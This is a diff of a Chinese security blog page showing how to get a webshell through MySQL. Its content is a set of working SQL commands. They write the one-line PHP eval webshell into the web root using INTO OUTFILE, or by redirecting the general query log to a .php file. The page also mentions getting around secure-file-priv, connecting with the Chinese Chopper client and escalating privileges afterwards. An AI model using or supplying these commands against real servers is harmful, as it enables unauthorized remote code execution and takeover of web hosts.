@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
+<meta name="description" content="前言:此方法可以绕过–secure-file-priv 进行getshell. 查看 –secure-file-priv是否开启: show global variables like &amp;apos;%secure%&amp;apos;;securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限) 直接getshellselect &amp;apos;&amp;lt;?php @eval">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用Mysql特性_getshell">
 <meta property="og:url" content="http://MaiKeFee.com/archives/9ddcdbfc.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
+<meta property="og:description" content="前言:此方法可以绕过–secure-file-priv 进行getshell. 查看 –secure-file-priv是否开启: show global variables like &amp;apos;%secure%&amp;apos;;securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限) 直接getshellselect &amp;apos;&amp;lt;?php @eval">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-18T17:26:41.105Z">
+<meta property="og:updated_time" content="2019-09-21T08:52:47.238Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用Mysql特性_getshell">
-<meta name="twitter:description" content="前言:直接getshellselect &amp;apos;&amp;lt;?php @eval($_POST[&amp;apos;maikefee&amp;apos;]); ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;网站目录/shell.php&amp;apos;;  mysql&amp;gt; set global general_log_file = &amp;apos;C:\ProgramData\MySQL\MySQL S">
+<meta name="twitter:description" content="前言:此方法可以绕过–secure-file-priv 进行getshell. 查看 –secure-file-priv是否开启: show global variables like &amp;apos;%secure%&amp;apos;;securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限) 直接getshellselect &amp;apos;&amp;lt;?php @eval">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-19T01:26:41+08:00">
-                2019-09-19
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-21T16:52:47+08:00">
+                2019-09-21
               </time>
             
           </span>
@@ -473,7 +473,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  169
+                  199
                 </span>
               
 
@@ -510,10 +510,11 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><h1 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h1><pre><code>select &apos;&lt;?php @eval($_POST[&apos;maikefee&apos;]); ?&gt;&apos; INTO OUTFILE &apos;网站目录/shell.php&apos;;
-
-mysql&gt; set global general_log_file = &apos;C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log&apos;;
-mysql&gt; set global general_log = off;</code></pre><h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell:"></a>利用日志getshell:</h1><h2 id="查看genera文件配置情况"><a href="#查看genera文件配置情况" class="headerlink" title="查看genera文件配置情况"></a>查看genera文件配置情况</h2><pre><code>show global variables like &quot;%genera%&quot;;</code></pre><h2 id="开启日志记录"><a href="#开启日志记录" class="headerlink" title="开启日志记录"></a>开启日志记录</h2><pre><code>set global general_log=&apos;on&apos;;</code></pre><h2 id="日志文件导出指定目录"><a href="#日志文件导出指定目录" class="headerlink" title="日志文件导出指定目录"></a>日志文件导出指定目录</h2><pre><code>set global general_log_file=&apos;C:/phpstudy/WWW/shell.php&apos;;</code></pre><h2 id="记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><a href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马" class="headerlink" title="记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)"></a>记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</h2><pre><code>select &apos;&lt;?php @eval($_POST[&quot;wintrysec&quot;]); ?&gt;&apos;;</code></pre><h2 id="关闭记录"><a href="#关闭记录" class="headerlink" title="关闭记录"></a>关闭记录</h2><h2 id="set-global-general-log-off"><a href="#set-global-general-log-off" class="headerlink" title="set global general_log=off;"></a>set global general_log=off;</h2><pre><code>菜刀连接后如果是普通权限，接下来开始提权</code></pre><p>提权:<br>    <a href="https://maikefee/archives/9ccf323f.html" target="_blank" rel="noopener">https://maikefee/archives/9ccf323f.html</a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>此方法可以绕过–secure-file-priv 进行getshell.</p>
+<p>查看 –secure-file-priv是否开启:</p>
+<pre><code>show global variables like &apos;%secure%&apos;;</code></pre><p>securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限)</p>
+<h1 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h1><pre><code>select &apos;&lt;?php @eval($_POST[&apos;maikefee&apos;]); ?&gt;&apos; INTO OUTFILE &apos;网站目录/shell.php&apos;;</code></pre><h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell:"></a>利用日志getshell:</h1><h2 id="查看genera文件配置情况"><a href="#查看genera文件配置情况" class="headerlink" title="查看genera文件配置情况"></a>查看genera文件配置情况</h2><pre><code>show global variables like &quot;%genera%&quot;;</code></pre><h2 id="开启日志记录"><a href="#开启日志记录" class="headerlink" title="开启日志记录"></a>开启日志记录</h2><pre><code>set global general_log=&apos;on&apos;;</code></pre><h2 id="日志文件导出指定目录"><a href="#日志文件导出指定目录" class="headerlink" title="日志文件导出指定目录"></a>日志文件导出指定目录</h2><pre><code>set global general_log_file=&apos;C:/phpstudy/WWW/shell.php&apos;;</code></pre><h2 id="记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><a href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马" class="headerlink" title="记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)"></a>记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</h2><pre><code>select &apos;&lt;?php @eval($_POST[&quot;wintrysec&quot;]); ?&gt;&apos;;</code></pre><h2 id="关闭记录"><a href="#关闭记录" class="headerlink" title="关闭记录"></a>关闭记录</h2><pre><code>set global general_log=off;
+菜刀连接后如果是普通权限，接下来开始提权</code></pre><p>提权:<br>    <a href="https://maikefee/archives/9ccf323f.html" target="_blank" rel="noopener">https://maikefee/archives/9ccf323f.html</a></p>
 
       
     </div>
@@ -543,7 +544,7 @@ mysql&gt; set global general_log = off;</code></pre><h1 id="利用日志getshell
   <p><span>本文标题:</span>利用Mysql特性_getshell</p>
   <p><span>文章作者:</span>MaiKeFee</p>
   <p><span>发布时间:</span>2019年09月14日</p>
-  <p><span>最后更新:</span>2019年09月19日</p>
+  <p><span>最后更新:</span>2019年09月21日</p>
   <p><span>原始链接:</span><a href="/archives/9ddcdbfc.html" title="利用Mysql特性_getshell">http://MaiKeFee.com/archives/9ddcdbfc.html</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/9ddcdbfc.html" aria-label="复制成功！"></i></span>
   </p>
@@ -721,12 +722,6 @@ mysql&gt; set global general_log = off;</code></pre><h1 id="利用日志getshell
                   </span>
                 
                   <span class="links-of-author-item">
-                    <a href="mailto:MaiKeFee@126.com" target="_blank" title="E-Mail">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
                     <a href="https://MaiKeFee.com/av_list" target="_blank" title="提权辅助">
                       
                         <i class="fa fa-fw fa-stack-overflow"></i>提权辅助</a>
@@ -795,7 +790,7 @@ mysql&gt; set global general_log = off;</code></pre><h1 id="利用日志getshell
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#直接getshell"><span class="nav-number">2.</span> <span class="nav-text">直接getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用日志getshell"><span class="nav-number">3.</span> <span class="nav-text">利用日志getshell:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看genera文件配置情况"><span class="nav-number">3.1.</span> <span class="nav-text">查看genera文件配置情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志记录"><span class="nav-number">3.2.</span> <span class="nav-text">开启日志记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志文件导出指定目录"><span class="nav-number">3.3.</span> <span class="nav-text">日志文件导出指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><span class="nav-number">3.4.</span> <span class="nav-text">记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭记录"><span class="nav-number">3.5.</span> <span class="nav-text">关闭记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#set-global-general-log-off"><span class="nav-number">3.6.</span> <span class="nav-text">set global general_log=off;</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#直接getshell"><span class="nav-number">2.</span> <span class="nav-text">直接getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用日志getshell"><span class="nav-number">3.</span> <span class="nav-text">利用日志getshell:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看genera文件配置情况"><span class="nav-number">3.1.</span> <span class="nav-text">查看genera文件配置情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志记录"><span class="nav-number">3.2.</span> <span class="nav-text">开启日志记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志文件导出指定目录"><span class="nav-number">3.3.</span> <span class="nav-text">日志文件导出指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><span class="nav-number">3.4.</span> <span class="nav-text">记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭记录"><span class="nav-number">3.5.</span> <span class="nav-text">关闭记录</span></a></li></ol></li></ol></div>
             
 
           </div>
